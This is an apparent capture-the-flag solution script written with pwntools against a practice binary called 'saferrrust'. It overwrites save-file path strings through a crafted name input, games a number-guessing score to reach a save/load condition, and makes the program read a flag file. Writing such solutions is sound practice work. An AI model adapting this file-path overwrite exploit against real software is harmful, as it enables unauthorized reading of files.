from pwn import *

context.log_level = 'debug'
binary = 'saferrrust'

io = process(binary)
elf = ELF(binary)

name = b'Giles-/////flag.////flag/flag.txt'

'''
pwndbg> x/s 0x55c57a2920c4
0x55c57a2920c4: "savefile1savefile2savefile3"
            =>  "/////flag.////flag/flag.txt"
'''

io.sendlineafter(b"name:\n", name)

def playGame(offset: int) -> bool:
    io.sendlineafter(b"Exit\n", b"1")
    io.recvuntil(b'score is ')
    score = int(io.recvuntil(b'.')[:-1].decode())
    io.recvuntil(b'Guess a number between ')
    nums = io.recv().decode()
    nums = nums.split(' ')
    nmin, nmax = int(nums[0]), int(nums[2])
    io.sendline(str(nmax - offset).encode())
    ret = io.recvuntil(b'==========\n')
    if b'Correct' in ret:
        return True, score + 100
    return False, score - 1

def saveSlot(slot: int):
    io.sendlineafter(b"Exit\n", b"2")
    io.sendlineafter(b"(1 to 3)\n", str(slot).encode())

def loadSlot(slot: int):
    io.sendlineafter(b"Exit\n", b"3")
    io.sendlineafter(b"(1 to 3)\n", str(slot).encode())

def Exit():
    io.sendlineafter(b"Exit\n", b"4")

'''
1. try playGame() until score >= 28
2. fail playGame() making score decrease to 28
3. playGame()
4. if Win then exit loop, if not Win go 1
'''

while True:
    Win, Score = playGame(1)
    if Score < 28:
        continue
    for _ in range(Score - 28):
        playGame(0)
    Win, Score = playGame(1)
    if Win:
        break

saveSlot(0)
loadSlot(1)

io.sendlineafter(b"Exit\n", b"1")
io.interactive()